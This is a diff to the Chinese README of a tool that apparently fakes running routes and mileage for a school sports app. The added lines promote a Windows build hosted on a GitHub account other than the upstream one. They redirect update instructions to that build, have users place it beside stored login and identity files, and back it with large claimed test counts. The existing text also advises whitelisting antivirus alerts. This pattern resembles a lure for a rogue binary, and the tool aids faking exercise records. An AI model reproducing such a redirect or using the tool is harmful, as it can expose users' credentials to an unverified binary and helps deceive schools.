@@ -1,3 +1,15 @@
+[⬇ 下载最新版 Windows x64（ZIP，2026-10-20 道路闭环修复版）](https://github.com/GAN1112233131/NekoSportsWorldTool/raw/refs/heads/main/downloads/NekoSportsWorldTool-Windows-x64-road-loop.zip)
+
+版本 **0.3.0**，包含图形界面和命令行，无需安装编译工具。解压后先关闭旧程序，将 `NekoSportsWorldTool-Windows-x64-road-loop.exe` 放入原工具目录运行，保留原有配置、登录信息和地图。安装或更新本修复版请使用上面的下载链接。
+
+本版修复道路刷新、围栏解析与登录失效处理；预览和正式道路生成均支持学校未返回围栏的情况，额外里程沿同一道路闭环重复。已有有效围栏仍会校验；无围栏时无法保证路线全程在校内。
+
+已通过 GUI 178 项、无 GUI 122 项、Windows 本机 163 项测试及窗口启动检查；手动地图和自动获取均完成真实点位的只读预览验证，未提交真实成绩或上传轨迹。
+
+[使用说明](downloads/README.md) · [完整验证报告](docs/bugfix-69856c91/route-refresh-verification.md) · [SHA-256 校验值](downloads/SHA256SUMS.txt)
+
+---
+
 <h1 style="font-size: 48px;">别倒卖了😭</h1>
 
 # NekoSportsWorldTool
@@ -53,12 +65,12 @@ NekoSportsWorldTool help                                 # 全部命令
 
 ## 常见问题
 
-- **提示未登录 / 401**：先执行 `login --remember`（GUI 勾选记住密码等价），会话失效会自动重登
+- **提示未登录 / 401**：学校接口拒绝旧会话时，请在账号栏正常重新登录，或通过 CLI 执行 `login --remember`。本地地图会保留；登录成功后再刷新路线点位。
 - **10121 设备风险**：设备身份是持久化的，删除 `identity.json` 等于换了新设备，不要频繁删
 - **10603 点位限流**：点位接口 5 分钟限 3 次，程序内置 300s 缓存，正常使用不会触发
 - **榜单为空**：当天还没有人产生有效里程，查询会自动回退最近 3 天
-- **检查更新失败**：更新仅直连 GitHub，网络不通时到 [Release](https://github.com/YanamiNeko/NekoSportsWorldTool/releases) 手动下载
-- **手动更新方式**：Windows 下载新的 `nekosportsworldtool.exe` 后退出软件，用新文件替换旧文件；请保留 `config.json`、`identity.json`、`points_cache.json` 等配置文件，不要删除或修改。
+- **检查更新失败**：本 Windows 修复版请从本文顶部链接手动下载；其他平台可查看[上游 Release](https://github.com/YanamiNeko/NekoSportsWorldTool/releases)。
+- **手动更新方式**：退出旧程序，解压顶部 Windows 压缩包，将 `NekoSportsWorldTool-Windows-x64-road-loop.exe` 放入原工具目录并运行这个新文件；请保留 `config.json`、`identity.json`、`points_cache.json` 等配置文件，不要删除或修改。
 - **人机验证失败**：自动重试 3 轮，仍失败大概率是网络波动，稍后再试
 - **杀软误报**：未签名编译产物可能被误报，自行判断后加白
 
